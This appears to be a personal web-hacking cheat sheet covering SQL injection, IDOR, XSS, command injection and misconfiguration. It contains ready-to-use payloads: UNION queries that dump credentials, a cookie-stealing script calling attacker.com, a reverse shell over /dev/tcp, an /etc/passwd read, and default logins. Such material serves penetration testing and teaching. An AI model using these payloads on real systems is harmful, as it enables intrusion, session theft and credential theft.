# 🕸️ Web Exploitation: The OWASP Top 10

**"The Ten Commandments of Web Hacking."**

Most web vulnerabilities fall into one of these categories. This is my checklist for testing web apps.

---

## 💉 1. SQL Injection (SQLi)
*Forcing the database to talk to you.*

**Detection:**
*   Add `'` (single quote) to inputs (`id=1'`). If you see a database error, it's vulnerable.
*   **Logical Test:** `id=1 OR 1=1` (True - shows all data) vs `id=1 AND 1=0` (False - shows nothing).

**Exploitation (Manual):**
```sql
' UNION SELECT 1, database(), user() -- // Get DB name and user
' UNION SELECT 1, username, password FROM users -- // Dump creds
```

Tools: SQLMap, Burp Suite

## 🔓 2. Broken Access Control (IDOR)

Accessing data you shouldn't see.

Scenario:
I am user 105. My profile URL is `site.com/profile?id=105.`

The Attack:
Change the ID to `106`. Can I see someone else's profile?

Tools: Burp Suite Intruder (Increment the number from 1 to 1000).

## 🎭 3. Cross-Site Scripting (XSS)

Running JavaScript in someone else's browser.

### Reflected XSS

I send a malicious link to a victim. They click it, and my script runs.

Test: `<script>alert(1)</script>` in search bars.

### Stored XSS (More Dangerous)

I upload a comment or post containing a script. Everyone who views the page gets hacked.

Stealing Cookies:

```bash 
Html

<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```
## 💻 4. Command Injection (RCE)

The Holy Grail. Executing OS commands on the server.

Detection:
Does the website use inputs to run system tasks (like Ping)?

Try separators: `;`, `|`, `&&`, `$(...)`.

Exploitation:

`127.0.0.1; whoami` -> Output: `www-data`

`127.0.0.1; cat /etc/passwd` -> Read files.

`127.0.0.1; bash -i >& /dev/tcp/ME/4444 0>&1` -> Reverse Shell.

## 🔐 5. Security Misconfiguration

The lazy admin problem.

Default Credentials: `admin/admin`, `tomcat/s3cret`.

Debug Mode Enabled: Detailed error messages revealing file paths.

Directory Listing: Being able to see files in `/uploads/` because `index.html` is missing.
